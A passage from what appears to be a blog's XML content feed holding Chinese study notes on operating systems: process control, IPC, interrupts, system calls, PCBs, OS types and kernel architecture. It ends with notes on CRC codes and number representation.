title="阻塞原语"></a>阻塞原语</h5><ul><li>找到要阻塞的进程对应的PCB</li><li>保护进程运行现场，将PCB状态信息设置为“阻塞态”，暂时停止进程运行</li><li>将PCB插入相应事件的等待队列</li></ul><h5 id="引起进程阻塞的事件"><a href="#引起进程阻塞的事件" class="headerlink" title="引起进程阻塞的事件"></a>引起进程阻塞的事件</h5><ul><li>需要等待系统分配某种资源</li><li>需要等待相互合作的其他进程完成工作</li></ul><h4 id="进程的唤醒"><a href="#进程的唤醒" class="headerlink" title="进程的唤醒"></a>进程的唤醒</h4><h5 id="唤醒原语"><a href="#唤醒原语" class="headerlink" title="唤醒原语"></a>唤醒原语</h5><ul><li>在事件等待队列中找到PCB</li><li>将PCB从等待队列移除，设置状态为就绪态</li><li>将PCB插入就绪队列，等待被调度</li></ul><h5 id="引起进程唤醒的事件"><a href="#引起进程唤醒的事件" class="headerlink" title="引起进程唤醒的事件"></a>引起进程唤醒的事件</h5><ul><li>等待的事件发生</li></ul><h4 id="进程的切换"><a href="#进程的切换" class="headerlink" title="进程的切换"></a>进程的切换</h4><h5 id="切换原语"><a href="#切换原语" class="headerlink" title="切换原语"></a>切换原语</h5><ul><li>将运行环境信息存入PCB</li><li>PCB移入相应队列</li><li>选择另一个进程执行，并更新其PCB</li><li>根据PCB恢复新进程所需的运行环境</li></ul><h5 id="引起进程切换的事件"><a href="#引起进程切换的事件" class="headerlink" title="引起进程切换的事件"></a>引起进程切换的事件</h5><ul><li>当前进程时间片到</li><li>有更高优先级的进程到达</li><li>当前进程主动阻塞</li><li>当前进程终止</li></ul><h3 id="知识回顾-1"><a href="#知识回顾-1" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-114.png" class="lazyload" data-srcset="/images/pasted-114.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="进程通信"><a href="#进程通信" class="headerlink" title="进程通信"></a>进程通信</h2><blockquote><p>进程通信就是指进程之间信息交换。进程是分配系统资源的单位（包括内存地址空间），因此各进程拥有的内存地址空间相对独立<br>为了保证安全，<strong>一个进程不能直接访问另一个进程的地址空间</strong></p></blockquote><h3 id="共享存储"><a href="#共享存储" class="headerlink" title="共享存储"></a>共享存储</h3><blockquote><p>两个进程对共享空间的访问必须是互斥的<br>操作系统只负责提供共享空间和同步互斥工具（如P、V操作）</p></blockquote><h4 id="基于数据结构的共享"><a href="#基于数据结构的共享" class="headerlink" title="基于数据结构的共享"></a>基于数据结构的共享</h4><ul><li>比如共享空间里只能放一个长度为10的数组。这种共享方式速度慢、限制多，是一种<strong>低级通信</strong>方式</li></ul><h4 id="基于存储区的共享"><a href="#基于存储区的共享" class="headerlink" title="基于存储区的共享"></a>基于存储区的共享</h4><ul><li>在内存中画出一块共享存储区，数据的形式、存放位置都由进程控制，而不是操作系统。相比之下，这种共享方式速度更快，是一种高级通信方式。</li></ul><h3 id="消息传递"><a href="#消息传递" class="headerlink" title="消息传递"></a>消息传递</h3><blockquote><p>进程间的数据交换以<strong>格式化的消息（Message）</strong>为单位。进程通过操作系统提供的“发送消息&#x2F;接受消息”两个原语进行数据交换<br>传递结构化的消息（消息头&#x2F;消息体）；消息头包括：发送进程ID、接受进程ID、消息类型、消息长度等格式化的信息</p></blockquote><h4 id="直接通信方式"><a href="#直接通信方式" class="headerlink" title="直接通信方式"></a>直接通信方式</h4><ul><li>消息直接挂到接收进程的消息缓冲队列中</li></ul><h4 id="间接通信方式"><a href="#间接通信方式" class="headerlink" title="间接通信方式"></a>间接通信方式</h4><ul><li>消息要先发送到中间实体（信箱）中，因此也称“信箱通信方式”。</li></ul><h3 id="管道通信"><a href="#管道通信" class="headerlink" title="管道通信"></a>管道通信</h3><blockquote><p>“管道”是指用于连接读写进程的一个共享文件，又名pipe文件。就是在内存中开辟一个大小固定的缓冲区</p></blockquote><ol><li>管道只能采用<strong>半双工通信</strong>，某一时间段内只能实现单向的传输。如果要实现<strong>双向同时通信</strong>，则需要设置两个管道。</li><li>各进程要互斥的访问管道</li><li>数据以字符流的形式写入管道，当管道写满时，写进程的writer()系统调用将被阻塞，等待读进程将数据取走，当读进程将数据全部取走后，管道变空，此时读进程的read()系统调用将被阻塞</li><li>如果没写满，就不允许读。如果没读空，就不允许写。</li><li>数据一旦被读出，就从管道中被抛弃，这就意味着读进程最多只能有一个，否则可能会读错数据的情况。</li></ol><h3 id="知识回顾-2"><a href="#知识回顾-2" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-115.png" class="lazyload" data-srcset="/images/pasted-115.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 - 中断和异常</title>
      <link href="/4461.html"/>
      <url>/4461.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>操作系统的中断和异常</p></blockquote><h2 id="中断和异常"><a href="#中断和异常" class="headerlink" title="中断和异常"></a>中断和异常</h2><h3 id="中断机制的诞生"><a href="#中断机制的诞生" class="headerlink" title="中断机制的诞生"></a>中断机制的诞生</h3><blockquote><p>本质：发生中断就意味着需要操作系统介入，开展管理工作</p></blockquote><h3 id="中断的概念和作用"><a href="#中断的概念和作用" class="headerlink" title="中断的概念和作用"></a>中断的概念和作用</h3><ol><li>当中断发生时，CPU立即进入核心态</li><li>当中断发生后，当前运行的进程暂停运行，并由操作系统内核对中断进行处理</li><li>对于不同的中断信号，会进行不同的处理</li></ol><ul><li><p>发生了中断，就意味着需要操作系统介入，开展管理工作。由于操作系统的管理工作（比如进程切换、分配I&#x2F;O设备等）需要使用特权指令，因此CPU要从用户态转为核心态。中断可以使CPU从用户态切换为核心态。使操作系统获得计算机的控制权。有了中断，才能实现多道程序并发执行。</p></li><li><p>用户态、核心态之间的切换是怎么实现的？</p><ul><li>“用户态 &#x3D;&gt; 核心态”是通过中断实现的，并且中断是唯一途径</li><li>“核心态 &#x3D;&gt; 用户态”的切换时通过执行一个特权指令，将程序状态字（PSW）的标志位设置为“用户态”</li></ul></li></ul><h3 id="中断的分类"><a href="#中断的分类" class="headerlink" title="中断的分类"></a>中断的分类</h3><ul><li>区别<ul><li>内中断信号来源：CPU内部与当前执行的指令有关</li><li>外中断信号来源：CPU外部与当前执行的指令无关</li></ul></li></ul><h4 id="内中断"><a href="#内中断" class="headerlink" title="内中断"></a>内中断</h4><blockquote><p>也称异常、例外、陷入</p></blockquote><ul><li>自愿中断 – 指令中断（系统调用）</li><li>强迫中断<ul><li>硬件故障（缺页）</li><li>软件中断（如：整数除0）</li></ul></li></ul><h4 id="外中断"><a href="#外中断" class="headerlink" title="外中断"></a>外中断</h4><ul><li>外设请求</li><li>人工干预</li></ul><h4 id="另一种方式"><a href="#另一种方式" class="headerlink" title="另一种方式"></a>另一种方式</h4><p><img src="/images/pasted-107.png" class="lazyload" data-srcset="/images/pasted-107.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="外中断的处理过程"><a href="#外中断的处理过程" class="headerlink" title="外中断的处理过程"></a>外中断的处理过程</h3><ol><li>每条指令执行结束后，CPU检查是否有外部中断信号</li><li>若有外部中断信号，则需要保护被中断进程的CPU环境</li><li>根据中断信号类型转入相应中断处理程序</li><li>恢复原进程的CPU环境并退出中断，返回原进程继续往下执行</li></ol><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-108.png" class="lazyload" data-srcset="/images/pasted-108.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="系统调用"><a href="#系统调用" class="headerlink" title="系统调用"></a>系统调用</h2><blockquote></blockquote><h3 id="系统调用的概念"><a href="#系统调用的概念" class="headerlink" title="系统调用的概念"></a>系统调用的概念</h3><blockquote><p>“系统调用” 是操作系统提供给应用程序（程序员&#x2F;编程人员）使用的接口，可以理解为一种可供应用程序调用的特殊函数，应用程序可以发出系统调用请求来获得操作系统的服务。</p></blockquote><ul><li>应用程序通过系统调用请求操作系统的服务。系统中的各种共享资源都由操作系统统一掌管，因此在用户程序中，凡是与资源有关的操作（如存储分配、I&#x2F;O操作，文件管理等），都必须通过系统调用的方式向操作系统提出服务请求，由操作系统代为完成。这样可以保证系统的稳定性和安全性，防止用户进行非法操作。</li></ul><h4 id="系统调用（按功能分类）"><a href="#系统调用（按功能分类）" class="headerlink" title="系统调用（按功能分类）"></a>系统调用（按功能分类）</h4><blockquote><p>系统调用相关处理涉及到对系统资源的管理、对进程的控制，这些功能需要执行一些特权指令才能完成，因此系统调用的相关处理需要在核心态下进行</p></blockquote><pre><code>1. 设备管理：完成设备的 请求/释放/启动 等功能2. 文件管理：完成文件的读/写/创建/删除 等功能3. 进程控制：完成进程的 创建/撤销/阻塞/唤醒/ 等功能4. 进程通信：完成进程之间的 消息传递/信号传递 等功能5. 内存管理：完成内存的分配/回收 等功能</code></pre><h3 id="系统调用背后的过程"><a href="#系统调用背后的过程" class="headerlink" title="系统调用背后的过程"></a>系统调用背后的过程</h3><p><img src="/images/pasted-109.png" class="lazyload" data-srcset="/images/pasted-109.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h3 id="知识回顾-1"><a href="#知识回顾-1" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-110.png" class="lazyload" data-srcset="/images/pasted-110.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="进程的定义、组成、组织方式、特征"><a href="#进程的定义、组成、组织方式、特征" class="headerlink" title="进程的定义、组成、组织方式、特征"></a>进程的定义、组成、组织方式、特征</h2><blockquote></blockquote><h3 id="进程的定义"><a href="#进程的定义" class="headerlink" title="进程的定义"></a>进程的定义</h3><blockquote><p>为了方便操作系统管理，完成各程序并发执行，引入进程、进程实体的概念</p></blockquote><ul><li>系统为每个运行的程序配置一个数据结构，称为进程控制块（PCB），用来描述进程的各种信息（如进程代码存放位置）</li><li>PCB、程序段、数据段三部分构成了进程实体（进程映像）。一般情况下，我们把进程实体简称为进程，例如，所谓创建进程，实质上是创建进程实体中的PCB；而撤销进程，实质上是撤销进程实体中的PCB</li><li>PCB是进程存在的唯一标志</li></ul><h4 id="从不同的角度，进程可以有不同的定义，比较传统典型的定义有："><a href="#从不同的角度，进程可以有不同的定义，比较传统典型的定义有：" class="headerlink" title="从不同的角度，进程可以有不同的定义，比较传统典型的定义有："></a>从不同的角度，进程可以有不同的定义，比较传统典型的定义有：</h4><ol><li>进程是程序的一次<strong>执行过程</strong>。</li><li>进程是一个程序及其数据在处理机上顺序执行时所<strong>发生的活动</strong>。</li><li>进程是具有独立功能的程序在数据集合上<strong>运行的过程</strong>（强调“动态性”），它是系统进行资源分配和调度的一个独立单位</li></ol><ul><li>引入进程实体的概念后，可把进程定义为：<br>  <strong>进程</strong>是进程实体的<strong>运行过程</strong>，是系统进行<strong>资源分配</strong>和<strong>调度</strong>的一个独立单位。</li></ul><p><strong>注：严格来说，进程实体和进程并不一样，进程实体是</strong>静态的<strong>，进程则是</strong>动态的<strong>，除非题目专门考察二者的区别，否则可以认为进程实体就是进程。</strong></p><h3 id="进程的组成"><a href="#进程的组成" class="headerlink" title="进程的组成"></a>进程的组成</h3><blockquote><p>进程（进程实体）由程序段、数据段、PCB三部分组成</p></blockquote><ul><li>程序代码存放在程序段</li><li>程序运行时使用、产生的运算数据。如全局变量、局部变量、宏定义的常量存放在数据段内</li><li>操作系统通过PCB来管理进程，因此PCB中应该包含操作系统对其进行管理所需的各种信息。</li></ul><h4 id="PCB"><a href="#PCB" class="headerlink" title="PCB"></a>PCB</h4><blockquote><p>进程的管理者（操作系统）所需的数据都在PCB中</p></blockquote><h5 id="进程描述信息"><a href="#进程描述信息" class="headerlink" title="进程描述信息"></a>进程描述信息</h5><ul><li><p>进程标识符PID</p><blockquote><p>当进程被创建时，操作系统会为该进程分配一个唯一的、不重复的ID，用于区分不同的进程。</p></blockquote></li><li><p>用户标识符UID</p></li></ul><h5 id="进程控制和管理信息"><a href="#进程控制和管理信息" class="headerlink" title="进程控制和管理信息"></a>进程控制和管理信息</h5><ul><li>进程当前状态</li><li>进程优先级</li></ul><h5 id="资源分配清单"><a href="#资源分配清单" class="headerlink" title="资源分配清单"></a>资源分配清单</h5><ul><li>程序段指针</li><li>数据段指针</li><li>键盘</li><li>鼠标</li></ul><h5 id="处理机相关信息"><a href="#处理机相关信息" class="headerlink" title="处理机相关信息"></a>处理机相关信息</h5><ul><li>各种寄存器指<blockquote><p>当进程切换时需要把进程当前的运行情况记录下来保存在PCB中，如程序计数器的值表示了当前程序执行到哪一句。</p></blockquote></li></ul><h3 id="进程的组织方式"><a href="#进程的组织方式" class="headerlink" title="进程的组织方式"></a>进程的组织方式</h3><ul><li>执行指针：指向当前处于运行态（执行态）的进程</li><li>就绪队列指针：指向当前处于就绪态的进程</li><li>阻塞队列指针：指向当前处于阻塞态的进程，很多操作系统还会根据阻塞原因不同，再分为多个阻塞队列</li></ul><h4 id="链接方式"><a href="#链接方式" class="headerlink" title="链接方式"></a>链接方式</h4><ol><li>按照进程状态将PCB发为多个队列</li><li>操作系统持有指向各个队列的指针</li></ol><h4 id="索引方式"><a href="#索引方式" class="headerlink" title="索引方式"></a>索引方式</h4><ol><li>根据进程状态的不同，建立几张索引表</li><li>操作系统持有指向各个索引表的指针</li></ol><h3 id="进程的特征"><a href="#进程的特征" class="headerlink" title="进程的特征"></a>进程的特征</h3><h4 id="动态性"><a href="#动态性" class="headerlink" title="动态性"></a>动态性</h4><ul><li>进程是程序的一次执行过程，是动态地产生、变化、消亡的</li></ul><h4 id="并发性"><a href="#并发性" class="headerlink" title="并发性"></a>并发性</h4><ul><li>内存中有多个进程实体，各进程可并发执行</li></ul><h4 id="独立性"><a href="#独立性" class="headerlink" title="独立性"></a>独立性</h4><ul><li>进程是能独立运行、独立获得资源、独立接受调度的基本单位</li></ul><h4 id="异步性"><a href="#异步性" class="headerlink" title="异步性"></a>异步性</h4><ul><li>各进程按各自独立的、不可预知的速度向前推进，操作系统要提供“进程同步机制”来解决异步问题</li><li>异步性会导致并发程序执行结果的不确定性</li></ul><h4 id="结构性"><a href="#结构性" class="headerlink" title="结构性"></a>结构性</h4><ul><li>每个进程都会配置一个PCB。结构上看，进程由程序段、数据段、PCB组成</li></ul><h3 id="知识回顾-2"><a href="#知识回顾-2" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-111.png" class="lazyload" data-srcset="/images/pasted-111.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 - 操作系统的特征</title>
      <link href="/51415.html"/>
      <url>/51415.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>操作系统的四个特征</p></blockquote><h2 id="操作系统的特征"><a href="#操作系统的特征" class="headerlink" title="操作系统的特征"></a>操作系统的特征</h2><blockquote><p>并发和共享是两个最基本的特征，二者互为存在条件</p></blockquote><h3 id="并发"><a href="#并发" class="headerlink" title="并发"></a>并发</h3><ul><li>指两个或多个事件在同一时间间隔内发生。这些事件宏观上是同时发生的，但微观上是交替发生的</li><li>并行：指两个或多个事件在同一时刻同时发生</li><li>操作系统的并发性：指计算机系统中同时存在着多个运行着的程序</li></ul><h3 id="共享"><a href="#共享" class="headerlink" title="共享"></a>共享</h3><ul><li>互斥共享方式：系统中的某些资源，虽然可以提供给多个进程使用，但一个时间段内只允许一个进程访问该资源</li><li>同时共享方式：系统中的某些资源，允许一个时间段内由多个进程“同时”对它们进行访问</li></ul><h3 id="虚拟"><a href="#虚拟" class="headerlink" title="虚拟"></a>虚拟</h3><ul><li>没有并发性虚拟性就无意义</li><li>虚拟是指把一个物理上的实体变为若干个逻辑上的对应物。物理实体（前者）是实际存在的，而逻辑上对应物（后者）是用户感受到的</li><li>空分复用技术（虚拟存储技术）</li><li>时分复用技术（虚拟处理器）</li></ul><h3 id="异步"><a href="#异步" class="headerlink" title="异步"></a>异步</h3><ul><li>在多道程序环境下，允许多个程序并发执行，但由于资源有限，进程的执行不是一贯到底，而是走走停停，以不可预知的速度向前推进，这就是进程的异步性</li></ul><hr><h2 id="操作系统的发展与分类"><a href="#操作系统的发展与分类" class="headerlink" title="操作系统的发展与分类"></a>操作系统的发展与分类</h2><h3 id="手工操作阶段"><a href="#手工操作阶段" class="headerlink" title="手工操作阶段"></a>手工操作阶段</h3><ul><li>主要缺点：用户独占全机，人机速度矛盾导致资源利用率极低</li></ul><h3 id="批处理阶段"><a href="#批处理阶段" class="headerlink" title="批处理阶段"></a>批处理阶段</h3><ul><li><p>单道批处理系统：引入脱机输入&#x2F;输出技术（用磁带完成），并监督程序负责控制作业的输入、输出</p><ul><li>主要优点：缓解了一定程度的人机速度矛盾，资源利用率有所提升</li><li>主要缺点：内存中仅能有一道程序运行，只有该程序运行结束后才能调入下一道程序，CPU有大量的时间是在等待I&#x2F;O完成。资源利用率依然很低</li></ul></li><li><p>多道批处理系统（操作系统开始出现）</p><ul><li>主要优点：多道程序并发执行，共享计算机资源。资源利用率大幅提升，CPU和其他资源保持“忙碌”状态，系统吞吐量增大。</li><li>主要缺点：用户响应时间过长，没有人机交互功能（用户提交自己的作业之后就只能等待计算机处理完成，中间不能控制自己的作业执行）</li></ul></li></ul><h3 id="分时操作系统"><a href="#分时操作系统" class="headerlink" title="分时操作系统"></a>分时操作系统</h3><blockquote><p>计算机以时间片为单位轮流为各个用户&#x2F;作业服务，各个用户可通过终端与计算机进行交互</p></blockquote><ul><li>主要优点：用户请求可以被即时响应，解决了人机交互问题。允许多个用户同时使用一台计算机，并且用户对计算机的操作相互独立，感受不到别人的存在</li><li>主要缺点：不能优先处理一些紧急任务。操作系统对各个用户&#x2F;作业都是完全公平的，循环地为每个用户&#x2F;作业服务一个时间片，不区分任务地紧急性</li></ul><h3 id="实时操作系统"><a href="#实时操作系统" class="headerlink" title="实时操作系统"></a>实时操作系统</h3><blockquote><p>在实时操作系统地控制下，计算机系统接收到外部信号后及时进行处理，并且要在严格地时限内处理完事件。实时操作系统地主要特点是及时性和可靠性。</p></blockquote><ul><li><p>硬实时系统：必须在绝对严格的规定时间内完成处理（如：导弹控制系统、自动驾驶系统）</p></li><li><p>软实时系统：能接受偶尔违反时间规定（如：12306火车订票系统）</p></li><li><p>主要优点：能够优先响应一些紧急任务，某些紧急任务不需时间片排队</p></li></ul><h3 id="网络操作系统"><a href="#网络操作系统" class="headerlink" title="网络操作系统"></a>网络操作系统</h3><blockquote><p>伴随着计算机网络的发展而诞生，能把网络中各个计算机有机的结合起来，实现数据传送等功能，实现网络中各种资源的共享（如文件共享）和各台计算机之间的通信。（如：Windows NT就是一种典型的网络操作系统，网站服务器就可以使用）</p></blockquote><h3 id="分布式操作系统"><a href="#分布式操作系统" class="headerlink" title="分布式操作系统"></a>分布式操作系统</h3><blockquote><p>主要特点是分布式和并行性。系统中的各台计算机地位相同，任何工作都可以分布在这些计算机上，由它们并行、协同完成这个任务</p></blockquote><h3 id="个人计算机操作系统"><a href="#个人计算机操作系统" class="headerlink" title="个人计算机操作系统"></a>个人计算机操作系统</h3><blockquote><p>Windows XP、MacOS，方便个人使用</p></blockquote><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-105.png" class="lazyload" data-srcset="/images/pasted-105.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr><h2 id="操作系统的运行机制、体系结构"><a href="#操作系统的运行机制、体系结构" class="headerlink" title="操作系统的运行机制、体系结构"></a>操作系统的运行机制、体系结构</h2><h3 id="运行机制"><a href="#运行机制" class="headerlink" title="运行机制"></a>运行机制</h3><ul><li>两种指令<ul><li>特权指令（如：内存清零指令）</li><li>非特权指令 （如：普通的运算指令）</li></ul><p>  </p></li><li>两种处理器状态<blockquote><p>用程序状态字寄存器（PSW）中的某标志位来标识当前处理器处于什么状态。如0为用户态，1为和心态</p></blockquote><ul><li>核心态（管态）</li><li>用户态（目态）</li></ul><p>  </p></li><li>两种程序<ul><li>内核程序：是系统的管理者，既可以执行特权指令，也可以执行非特权指令，运行在核心态</li><li>应用程序：为了保证系统能安全运行，普通应用程序只能执行非特权指令，运行在用户态</li></ul></li></ul><h3 id="操作系统内核"><a href="#操作系统内核" class="headerlink" title="操作系统内核"></a>操作系统内核</h3><blockquote><p>内核是计算机上配置的底层软件，是操作系统最基本、最核心的部分；实现操作系统内核功能的那些程序就是内核程序</p></blockquote><ul><li><p>时钟管理：实现计时功能</p></li><li><p>中断管理</p></li><li><p>原语</p><blockquote><p>设备驱动、CPU切换等</p></blockquote><ul><li>是一种特殊的程序</li><li>处于操作系统最底层，是最接近硬件的部分</li><li>这种程序的运行具有原子性 – 其运行只能一气呵成，不可中断</li><li>运行时间较短、调用频繁</li></ul></li><li><p>对系统资源进行管理的功能</p><ul><li>进程管理</li><li>存储器管理</li><li>设备管理</li></ul></li></ul><h3 id="操作系统体系结构"><a href="#操作系统体系结构" class="headerlink" title="操作系统体系结构"></a>操作系统体系结构</h3><ul><li><p>大内核</p><ul><li>将操作系统的主要功能模块都作为系统内核，运行在核心态</li><li>优点：高性能</li><li>缺点：内核代码庞大，结构混乱，难以维护</li></ul></li><li><p>微内核</p><ul><li>只把最基本的功能保留在内核</li><li>优点：内核功能少，结构清晰，方便为何</li><li>缺点：需要频繁的在核心态和用户态之间切换，性能低</li></ul></li></ul><h3 id="知识回顾-1"><a href="#知识回顾-1" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-106.png" class="lazyload" data-srcset="/images/pasted-106.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><hr>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>操作系统 - 概念功能和目标</title>
      <link href="/30168.html"/>
      <url>/30168.html</url>
      
        <content type="html"><![CDATA[<h2 id="操作系统"><a href="#操作系统" class="headerlink" title="操作系统"></a>操作系统</h2><blockquote><p>操作系统的概念（定义）功能和目标</p></blockquote><h3 id="操作系统的概念（定义）"><a href="#操作系统的概念（定义）" class="headerlink" title="操作系统的概念（定义）"></a>操作系统的概念（定义）</h3><blockquote><p>操作系统（Operating System， OS）是指控制和管理整个计算机系统的硬件和软件资源，并合理地组织调度计算机的工作和资源的分配，以提供给用户和其他软件方便的接口和环境，它是计算机系统中最基本的系统软件</p></blockquote><ol><li>负责管理协调硬件、软件等计算机资源的工作</li><li>为上层的应用程序、用户提供简单易用的服务</li><li>操作系统是系统软件，而不是硬件</li></ol><h3 id="操作系统的功能和目标"><a href="#操作系统的功能和目标" class="headerlink" title="操作系统的功能和目标"></a>操作系统的功能和目标</h3><blockquote><p>补充知识：进程是一个程序的执行过程。执行前需要将该程序放到内存中，才能被CPU处理。</p></blockquote><ul><li>操作系统作为系统资源的管理（这些资源包括软件、硬件、文件等），需要提供什么功能？<br>  追求的目标：安全、高效</li></ul><pre><code>1. 处理机管理2. 存储器管理3. 文件管理4. 设备管理</code></pre><p>     </p><ul><li><p>操作系统作为用户与计算机硬件之间的接口，要为其上层的用户、应用程序提供简单易用的服务，需要实现什么功能？</p><ol><li>命令接口：允许用户直接使用</li></ol></li></ul><pre><code>2. 程序接口：允许用户通过程序间接使用3. GUI：现代操作系统中最流行的图形用户接口</code></pre><p>        </p><ul><li>操作系统作为最接近硬件的层次，需要在纯硬件的基础上实现什么功能？<ul><li>实现对硬件机器的拓展</li><li>没有任何软件支持的计算机称为裸机。在裸机上安装的操作系统，可以提供资源管理功能和方便用户的服务功能，将裸机改造成功能更强、使用更方便的机器</li></ul></li></ul><p>    </p><h4 id="作为用户和计算机硬件之间的接口"><a href="#作为用户和计算机硬件之间的接口" class="headerlink" title="作为用户和计算机硬件之间的接口"></a>作为用户和计算机硬件之间的接口</h4><ul><li><p>提供的功能 – 用户接口</p><ul><li>命令接口</li></ul></li></ul><p>   1. 联机命令接口：用户说一句，系统做一句（交互式命令接口）<br>    2. 脱机命令接口：用户说一堆，系统做一堆</p><ul><li>程序接口：由一组系统调用组成（程序接口 &#x3D; 系统调用）<ul><li>如 C:\Windows\System32\user32.dll 程序员在程序中调用user32.dll（该调用过程即为系统调用）即可实现创建窗口等功能。只能通过用户程序间接使用。</li></ul></li><li>GUI用户界面</li></ul><ul><li>目标：方便用户使用</li></ul><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-104.png" class="lazyload" data-srcset="/images/pasted-104.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p>]]></content>
      
      
      <categories>
          
          <category> 操作系统 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>循环冗余校验码</title>
      <link href="/40131.html"/>
      <url>/40131.html</url>
      
        <content type="html"><![CDATA[<blockquote><p>第二章 数据的表示和运算</p></blockquote><h2 id="循环冗余校验码（CRC码）"><a href="#循环冗余校验码（CRC码）" class="headerlink" title="循环冗余校验码（CRC码）"></a>循环冗余校验码（CRC码）</h2><blockquote><p>循环冗余校验码（Cyclic Redundancy Check, CRC）</p></blockquote><h3 id="基本思想"><a href="#基本思想" class="headerlink" title="基本思想"></a>基本思想</h3><ul><li><p>数据发送、接收方约定一个“除数”，数据出错导致余数改变 – 检测到错误<br> <img src="/images/pasted-99.png" class="lazyload" data-srcset="/images/pasted-99.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>理论上可以证明循环冗余校验码的检错能力有以下特点：</p><ol><li>可以检测出所有奇数个错误</li><li>可检测出所有双比特的错误</li><li>可检测出所有小于等于校验位长度的连续错误<br><img src="/images/pasted-100.png" class="lazyload" data-srcset="/images/pasted-100.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ol></li></ul><h3 id="知识回顾"><a href="#知识回顾" class="headerlink" title="知识回顾"></a>知识回顾</h3><p><img src="/images/pasted-101.png" class="lazyload" data-srcset="/images/pasted-101.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p><h2 id="定点数"><a href="#定点数" class="headerlink" title="定点数"></a>定点数</h2><h3 id="无符号数"><a href="#无符号数" class="headerlink" title="无符号数"></a>无符号数</h3><ul><li><p>整个机器字长的全部二进制均为数值位，没有符号位，相当于数的绝对值。</p></li><li><p>原码：用尾数表示真值的绝对值，符号位“0&#x2F;1”对应“正&#x2F;负”<br><img src="/images/pasted-102.png" class="lazyload" data-srcset="/images/pasted-102.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></p></li><li><p>反码：</p><ul><li>若符号位为0，则反码与原码相同</li><li>若符号位为1，则数值位全部取反   <br><img src="/images/pasted-103.png" class="lazyload" data-srcset="/images/pasted-103.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==" alt="upload successful"></li></ul></li><li><p>补码</p><ul><li>正数的补码 &#x3D; 原码<br>    + 负数的补码 &#x3D; 反码末位 + 1（要考虑进位）</li></ul></li></ul><p>    </p>]]></content>
      
      
      <categories>
          
          <category> 计算机组成 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> bilibili大学 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>数据的表示和运算</title>
      <link href="/55074.html"/>
      <url>/55074.html</url>
      
